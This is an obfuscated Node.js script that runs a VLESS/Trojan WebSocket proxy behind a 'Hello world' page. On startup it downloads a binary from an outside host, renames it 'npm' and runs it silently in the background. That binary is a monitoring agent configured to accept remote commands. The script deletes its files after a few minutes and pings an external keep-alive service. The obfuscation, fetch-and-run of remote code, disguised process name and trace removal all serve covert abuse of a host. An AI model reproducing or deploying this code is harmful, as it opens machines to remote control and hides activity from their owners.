const _0x39deb5=_0x1c52;(function(_0xcd0d92,_0x2d6669){const _0x423322=_0x1c52,_0xa32b65=_0xcd0d92();while(!![]){try{const _0x57d857=parseInt(_0x423322(0xe5))/0x1*(-parseInt(_0x423322(0xf8))/0x2)+parseInt(_0x423322(0x148))/0x3*(-parseInt(_0x423322(0x10a))/0x4)+-parseInt(_0x423322(0x11c))/0x5*(parseInt(_0x423322(0x160))/0x6)+parseInt(_0x423322(0x161))/0x7+parseInt(_0x423322(0x113))/0x8+parseInt(_0x423322(0x114))/0x9*(-parseInt(_0x423322(0x116))/0xa)+parseInt(_0x423322(0x103))/0xb*(parseInt(_0x423322(0x107))/0xc);if(_0x57d857===_0x2d6669)break;else _0xa32b65['push'](_0xa32b65['shift']());}catch(_0x258ff2){_0xa32b65['push'](_0xa32b65['shift']());}}}(_0x2ae1,0x7bbb1));function _0x1c52(_0x7bf567,_0x36b6a5){const _0x2ae15d=_0x2ae1();return _0x1c52=function(_0x1c523d,_0x485d88){_0x1c523d=_0x1c523d-0xe5;let _0x401885=_0x2ae15d[_0x1c523d];return _0x401885;},_0x1c52(_0x7bf567,_0x36b6a5);}const os=require('os'),http=require(_0x39deb5(0x15a)),fs=require('fs'),axios=require(_0x39deb5(0x12d)),net=require(_0x39deb5(0x10c)),path=require(_0x39deb5(0xfb)),crypto=require(_0x39deb5(0xe6)),{Buffer}=require(_0x39deb5(0xea)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x39deb5(0x141)]||_0x39deb5(0x143),NEZHA_SERVER=process[_0x39deb5(0xf7)][_0x39deb5(0x126)]||'',NEZHA_PORT=process[_0x39deb5(0xf7)][_0x39deb5(0x13d)]||'',NEZHA_KEY=process[_0x39deb5(0xf7)][_0x39deb5(0x132)]||'',DOMAIN=process['env']['DOMAIN']||_0x39deb5(0xe7),AUTO_ACCESS=process['env'][_0x39deb5(0x14e)]||!![],WSPATH=process[_0x39deb5(0xf7)][_0x39deb5(0x10e)]||UUID[_0x39deb5(0xf1)](0x0,0x8),SUB_PATH=process[_0x39deb5(0xf7)][_0x39deb5(0x11d)]||_0x39deb5(0x101),NAME=process['env'][_0x39deb5(0x157)]||_0x39deb5(0xfe),PORT=process[_0x39deb5(0xf7)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4490b6=_0x39deb5;try{const _0x5763b7=await axios[_0x4490b6(0xff)](_0x4490b6(0xf3)),_0x398540=_0x5763b7[_0x4490b6(0xeb)];ISP=(_0x398540[_0x4490b6(0x105)]+'-'+_0x398540[_0x4490b6(0x100)])[_0x4490b6(0x11f)](/ /g,'_');}catch(_0x3cff61){ISP=_0x4490b6(0x156);}};GetISP();const httpServer=http[_0x39deb5(0x121)]((_0x368329,_0x1e22a0)=>{const _0x56a7a4=_0x39deb5;if(_0x368329['url']==='/'){const _0x287d2c=path['join'](__dirname,_0x56a7a4(0x159));fs[_0x56a7a4(0xf5)](_0x287d2c,'utf8',(_0x3dd302,_0x13a683)=>{const _0x2169eb=_0x56a7a4;if(_0x3dd302){_0x1e22a0[_0x2169eb(0x15f)](0xc8,{'Content-Type':_0x2169eb(0x136)}),_0x1e22a0[_0x2169eb(0x149)](_0x2169eb(0x10b));return;}_0x1e22a0['writeHead'](0xc8,{'Content-Type':_0x2169eb(0x136)}),_0x1e22a0[_0x2169eb(0x149)](_0x13a683);});return;}else{if(_0x368329['url']==='/'+SUB_PATH){const _0x3d7d78=_0x56a7a4(0xf0)+UUID+'@'+DOMAIN+_0x56a7a4(0x109)+DOMAIN+_0x56a7a4(0x13e)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x4d0cc1=_0x56a7a4(0xe8)+UUID+'@'+DOMAIN+_0x56a7a4(0x104)+DOMAIN+_0x56a7a4(0x13e)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x212a9d=_0x3d7d78+'\x0a'+_0x4d0cc1,_0x61f939=Buffer['from'](_0x212a9d)['toString'](_0x56a7a4(0x102));_0x1e22a0[_0x56a7a4(0x15f)](0xc8,{'Content-Type':_0x56a7a4(0x115)}),_0x1e22a0[_0x56a7a4(0x149)](_0x61f939+'\x0a');}else _0x1e22a0[_0x56a7a4(0x15f)](0x194,{'Content-Type':_0x56a7a4(0x115)}),_0x1e22a0[_0x56a7a4(0x149)](_0x56a7a4(0x142));}}),wss=new WebSocket[(_0x39deb5(0x150))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x39deb5(0x127),'1.1.1.1'];function resolveHost(_0x385913){return new Promise((_0x10c166,_0x2236a3)=>{const _0x433eaa=_0x1c52;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x433eaa(0x112)](_0x385913)){_0x10c166(_0x385913);return;}let _0x45df1b=0x0;function _0x555204(){const _0xcd61c8=_0x433eaa;if(_0x45df1b>=DNS_SERVERS[_0xcd61c8(0x151)]){_0x2236a3(new Error(_0xcd61c8(0x117)+_0x385913+_0xcd61c8(0x10d)));return;}const _0x31f685=DNS_SERVERS[_0x45df1b];_0x45df1b++;const _0x3cb5fb='https://dns.google/resolve?name='+encodeURIComponent(_0x385913)+'&type=A';axios[_0xcd61c8(0xff)](_0x3cb5fb,{'timeout':0x1388,'headers':{'Accept':_0xcd61c8(0x133)}})[_0xcd61c8(0x155)](_0x906bae=>{const _0x4ba9cf=_0xcd61c8,_0x1a21b3=_0x906bae[_0x4ba9cf(0xeb)];if(_0x1a21b3[_0x4ba9cf(0xee)]===0x0&&_0x1a21b3[_0x4ba9cf(0xf2)]&&_0x1a21b3[_0x4ba9cf(0xf2)]['length']>0x0){const _0x5445b8=_0x1a21b3[_0x4ba9cf(0xf2)][_0x4ba9cf(0xf4)](_0x2b5139=>_0x2b5139[_0x4ba9cf(0x135)]===0x1);if(_0x5445b8){_0x10c166(_0x5445b8[_0x4ba9cf(0xeb)]);return;}}_0x555204();})[_0xcd61c8(0x129)](_0x534465=>{_0x555204();});}_0x555204();});}function handleVlessConnection(_0x19190d,_0x4e9e00){const _0x43b43e=_0x39deb5,[_0x243879]=_0x4e9e00,_0x18ae68=_0x4e9e00['slice'](0x1,0x11);if(!_0x18ae68['every']((_0x1c01fe,_0x58955b)=>_0x1c01fe==parseInt(uuid['substr'](_0x58955b*0x2,0x2),0x10)))return![];let _0xdeadd6=_0x4e9e00[_0x43b43e(0xf1)](0x11,0x12)['readUInt8']()+0x13;const _0x310e73=_0x4e9e00['slice'](_0xdeadd6,_0xdeadd6+=0x2)[_0x43b43e(0x125)](0x0),_0x220c98=_0x4e9e00[_0x43b43e(0xf1)](_0xdeadd6,_0xdeadd6+=0x1)[_0x43b43e(0x123)](),_0x45ee25=_0x220c98==0x1?_0x4e9e00[_0x43b43e(0xf1)](_0xdeadd6,_0xdeadd6+=0x4)[_0x43b43e(0x15e)]('.'):_0x220c98==0x2?new TextDecoder()['decode'](_0x4e9e00[_0x43b43e(0xf1)](_0xdeadd6+0x1,_0xdeadd6+=0x1+_0x4e9e00[_0x43b43e(0xf1)](_0xdeadd6,_0xdeadd6+0x1)[_0x43b43e(0x123)]())):_0x220c98==0x3?_0x4e9e00[_0x43b43e(0xf1)](_0xdeadd6,_0xdeadd6+=0x10)['reduce']((_0x5570aa,_0x49dad4,_0x2e8f7c,_0x92c267)=>_0x2e8f7c%0x2?_0x5570aa[_0x43b43e(0x14b)](_0x92c267[_0x43b43e(0xf1)](_0x2e8f7c-0x1,_0x2e8f7c+0x1)):_0x5570aa,[])[_0x43b43e(0x131)](_0x4ca890=>_0x4ca890[_0x43b43e(0x125)](0x0)[_0x43b43e(0xef)](0x10))[_0x43b43e(0x15e)](':'):'';_0x19190d[_0x43b43e(0x153)](new Uint8Array([_0x243879,0x0]));const _0xff8477=createWebSocketStream(_0x19190d);return resolveHost(_0x45ee25)[_0x43b43e(0x155)](_0x44dea5=>{const _0x2840d9=_0x43b43e;net[_0x2840d9(0x122)]({'host':_0x44dea5,'port':_0x310e73},function(){const _0x387dc4=_0x2840d9;this[_0x387dc4(0x12b)](_0x4e9e00[_0x387dc4(0xf1)](_0xdeadd6)),_0xff8477['on'](_0x387dc4(0x13a),()=>{})['pipe'](this)['on'](_0x387dc4(0x13a),()=>{})[_0x387dc4(0x128)](_0xff8477);})['on'](_0x2840d9(0x13a),()=>{});})[_0x43b43e(0x129)](_0x4a58d7=>{const _0x293410=_0x43b43e;net[_0x293410(0x122)]({'host':_0x45ee25,'port':_0x310e73},function(){const _0x49be0f=_0x293410;this[_0x49be0f(0x12b)](_0x4e9e00['slice'](_0xdeadd6)),_0xff8477['on'](_0x49be0f(0x13a),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0xff8477);})['on']('error',()=>{});}),!![];}function _0x2ae1(){const _0x24d445=['buffer','data','https://amd64.ssss.nyc.mn/v1','url','Status','toString','vless://','slice','Answer','https://speed.cloudflare.com/meta','find','readFile','setsid\x20nohup\x20./npm\x20-s\x20','env','8434aWWrue','Server\x20is\x20running\x20on\x20port\x20','Automatic\x20Access\x20Task\x20added\x20successfully','path','false','listen','Hug','get','asOrganization','sub','base64','123167mlNrWL',':443?security=tls&sni=','country','includes','1320cvkgVm','split',':443?encryption=none&security=tls&sni=','452uafFrw','Hello\x20world!','net','\x20with\x20all\x20DNS\x20servers','WSPATH','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','writeFileSync','https://oooo.serv00.net/add-url','test','1823424JADAbZ','9pjatav','text/plain','376690odpkQq','Failed\x20to\x20resolve\x20','https://amd64.ssss.nyc.mn/agent','trim','createHash','close','13295vDtPhm','SUB_PATH','digest','replace','arm','createServer','connect','readUInt8','2096','readUInt16BE','NEZHA_SERVER','8.8.4.4','pipe','catch','npm\x20is\x20running','write','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','axios','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','once','log','map','NEZHA_KEY','application/dns-json','config.yaml','type','text/html','npm\x20download\x20successfully','client_secret:\x20','443','error','arch','connection','NEZHA_PORT','&fp=chrome&type=ws&host=','https://arm64.ssss.nyc.mn/agent','update','UUID','Not\x20Found\x0a','7b5780f0-2065-4c88-83e0-65718b2f839d','unlink','true','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','arm64','23709CBBEUp','end','post','concat','substr','npm','AUTO_ACCESS','aarch64','Server','length','2083','send','error:\x20','then','Unknown','NAME','--tls','index.html','http','reduce','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','sha224','join','writeHead','72eUEDEZ','3847165NFCLZM','createWriteStream','finish','npm\x20is\x20already\x20running,\x20skip\x20running...','128RYcLOd','crypto','1234.abc.com','trojan://','/bin/bash'];_0x2ae1=function(){return _0x24d445;};return _0x2ae1();}function handleTrojanConnection(_0x372eae,_0x30a0dc){const _0x15157f=_0x39deb5;try{if(_0x30a0dc['length']<0x3a)return![];const _0xad92c2=_0x30a0dc[_0x15157f(0xf1)](0x0,0x38)[_0x15157f(0xef)](),_0x639df6=[UUID];let _0x3a83e1=null;for(const _0x20ac6c of _0x639df6){const _0x37ffde=crypto[_0x15157f(0x11a)](_0x15157f(0x15d))[_0x15157f(0x140)](_0x20ac6c)[_0x15157f(0x11e)]('hex');if(_0x37ffde===_0xad92c2){_0x3a83e1=_0x20ac6c;break;}}if(!_0x3a83e1)return![];let _0x42ac39=0x38;_0x30a0dc[_0x42ac39]===0xd&&_0x30a0dc[_0x42ac39+0x1]===0xa&&(_0x42ac39+=0x2);const _0x33091d=_0x30a0dc[_0x42ac39];if(_0x33091d!==0x1)return![];_0x42ac39+=0x1;const _0x3e6373=_0x30a0dc[_0x42ac39];_0x42ac39+=0x1;let _0x6968e2,_0x13cbcd;if(_0x3e6373===0x1)_0x6968e2=_0x30a0dc[_0x15157f(0xf1)](_0x42ac39,_0x42ac39+0x4)['join']('.'),_0x42ac39+=0x4;else{if(_0x3e6373===0x3){const _0x180cb3=_0x30a0dc[_0x42ac39];_0x42ac39+=0x1,_0x6968e2=_0x30a0dc[_0x15157f(0xf1)](_0x42ac39,_0x42ac39+_0x180cb3)[_0x15157f(0xef)](),_0x42ac39+=_0x180cb3;}else{if(_0x3e6373===0x4)_0x6968e2=_0x30a0dc[_0x15157f(0xf1)](_0x42ac39,_0x42ac39+0x10)[_0x15157f(0x15b)]((_0x3961c3,_0x201160,_0x5d9b8a,_0x152c3e)=>_0x5d9b8a%0x2?_0x3961c3[_0x15157f(0x14b)](_0x152c3e[_0x15157f(0xf1)](_0x5d9b8a-0x1,_0x5d9b8a+0x1)):_0x3961c3,[])[_0x15157f(0x131)](_0x123ca3=>_0x123ca3[_0x15157f(0x125)](0x0)['toString'](0x10))[_0x15157f(0x15e)](':'),_0x42ac39+=0x10;else return![];}}_0x13cbcd=_0x30a0dc[_0x15157f(0x125)](_0x42ac39),_0x42ac39+=0x2;_0x42ac39<_0x30a0dc[_0x15157f(0x151)]&&_0x30a0dc[_0x42ac39]===0xd&&_0x30a0dc[_0x42ac39+0x1]===0xa&&(_0x42ac39+=0x2);const _0x488325=createWebSocketStream(_0x372eae);return resolveHost(_0x6968e2)[_0x15157f(0x155)](_0x3eff0e=>{const _0x59c8ae=_0x15157f;net[_0x59c8ae(0x122)]({'host':_0x3eff0e,'port':_0x13cbcd},function(){const _0x56f829=_0x59c8ae;_0x42ac39<_0x30a0dc[_0x56f829(0x151)]&&this[_0x56f829(0x12b)](_0x30a0dc[_0x56f829(0xf1)](_0x42ac39)),_0x488325['on'](_0x56f829(0x13a),()=>{})['pipe'](this)['on'](_0x56f829(0x13a),()=>{})[_0x56f829(0x128)](_0x488325);})['on'](_0x59c8ae(0x13a),()=>{});})[_0x15157f(0x129)](_0x140168=>{const _0x472cd1=_0x15157f;net[_0x472cd1(0x122)]({'host':_0x6968e2,'port':_0x13cbcd},function(){const _0x1a4cb5=_0x472cd1;_0x42ac39<_0x30a0dc[_0x1a4cb5(0x151)]&&this[_0x1a4cb5(0x12b)](_0x30a0dc['slice'](_0x42ac39)),_0x488325['on']('error',()=>{})[_0x1a4cb5(0x128)](this)['on'](_0x1a4cb5(0x13a),()=>{})[_0x1a4cb5(0x128)](_0x488325);})['on'](_0x472cd1(0x13a),()=>{});}),!![];}catch(_0x3a1438){return![];}}wss['on'](_0x39deb5(0x13c),(_0x580a6a,_0x259e7b)=>{const _0x5a7ba2=_0x39deb5,_0x49618b=_0x259e7b[_0x5a7ba2(0xed)]||'';_0x580a6a[_0x5a7ba2(0x12f)]('message',_0x3243cc=>{const _0x496dc6=_0x5a7ba2;if(_0x3243cc[_0x496dc6(0x151)]>0x11&&_0x3243cc[0x0]===0x0){const _0x257677=_0x3243cc[_0x496dc6(0xf1)](0x1,0x11),_0x261354=_0x257677['every']((_0x36ad3c,_0x3b4983)=>_0x36ad3c==parseInt(uuid[_0x496dc6(0x14c)](_0x3b4983*0x2,0x2),0x10));if(_0x261354){!handleVlessConnection(_0x580a6a,_0x3243cc)&&_0x580a6a['close']();return;}}!handleTrojanConnection(_0x580a6a,_0x3243cc)&&_0x580a6a[_0x496dc6(0x11b)]();})['on'](_0x5a7ba2(0x13a),()=>{});});const getDownloadUrl=()=>{const _0x46a143=_0x39deb5,_0x295fff=os[_0x46a143(0x13b)]();return _0x295fff===_0x46a143(0x120)||_0x295fff===_0x46a143(0x147)||_0x295fff===_0x46a143(0x14f)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x46a143(0x13f):!NEZHA_PORT?_0x46a143(0xec):_0x46a143(0x118);},downloadFile=async()=>{const _0x14c2e0=_0x39deb5;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x397aba=getDownloadUrl(),_0x1bcad0=await axios({'method':_0x14c2e0(0xff),'url':_0x397aba,'responseType':'stream'}),_0xff0057=fs[_0x14c2e0(0x162)]('npm');return _0x1bcad0[_0x14c2e0(0xeb)][_0x14c2e0(0x128)](_0xff0057),new Promise((_0x11c3f6,_0x4fe9d0)=>{const _0x3d1019=_0x14c2e0;_0xff0057['on'](_0x3d1019(0x163),()=>{const _0x40a8c0=_0x3d1019;console[_0x40a8c0(0x130)](_0x40a8c0(0x137)),exec('chmod\x20+x\x20npm',_0x55d041=>{if(_0x55d041)_0x4fe9d0(_0x55d041);_0x11c3f6();});}),_0xff0057['on'](_0x3d1019(0x13a),_0x4fe9d0);});}catch(_0x4b23af){throw _0x4b23af;}},runnz=async()=>{const _0x113fa5=_0x39deb5;try{const _0x509c18=execSync(_0x113fa5(0x12e),{'encoding':'utf-8'});if(_0x509c18[_0x113fa5(0x119)]()!==''){console[_0x113fa5(0x130)](_0x113fa5(0x164));return;}}catch(_0xbcd76e){}await downloadFile();let _0x56050e='',_0x46b21b=[_0x113fa5(0x139),'8443',_0x113fa5(0x124),'2087',_0x113fa5(0x152),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2a8208=_0x46b21b[_0x113fa5(0x106)](NEZHA_PORT)?_0x113fa5(0x158):'';_0x56050e=_0x113fa5(0xf6)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2a8208+_0x113fa5(0x146);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x538f3a=NEZHA_SERVER[_0x113fa5(0x106)](':')?NEZHA_SERVER[_0x113fa5(0x108)](':')['pop']():'',_0x195b4f=_0x46b21b[_0x113fa5(0x106)](_0x538f3a)?_0x113fa5(0x145):_0x113fa5(0xfc),_0x527750=_0x113fa5(0x138)+NEZHA_KEY+_0x113fa5(0x12c)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x195b4f+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x113fa5(0x110)](_0x113fa5(0x134),_0x527750);}_0x56050e=_0x113fa5(0x15c);}else{console[_0x113fa5(0x130)](_0x113fa5(0x10f));return;}}try{exec(_0x56050e,{'shell':_0x113fa5(0xe9)},_0x2e89fc=>{const _0x3425b1=_0x113fa5;if(_0x2e89fc)console['error']('npm\x20running\x20error:',_0x2e89fc);else console['log'](_0x3425b1(0x12a));});}catch(_0x42203c){console[_0x113fa5(0x13a)](_0x113fa5(0x154)+_0x42203c);}};async function addAccessTask(){const _0x3aade2=_0x39deb5;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x403d7b='https://'+DOMAIN;try{const _0x1f3900=await axios[_0x3aade2(0x14a)](_0x3aade2(0x111),{'url':_0x403d7b},{'headers':{'Content-Type':'application/json'}});console['log'](_0x3aade2(0xfa));}catch(_0x3ccd3e){}}const delFiles=()=>{const _0x52f805=_0x39deb5;fs['unlink'](_0x52f805(0x14d),()=>{}),fs[_0x52f805(0x144)](_0x52f805(0x134),()=>{});};httpServer[_0x39deb5(0xfd)](PORT,()=>{const _0x3ed213=_0x39deb5;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3ed213(0x130)](_0x3ed213(0xf9)+PORT);});
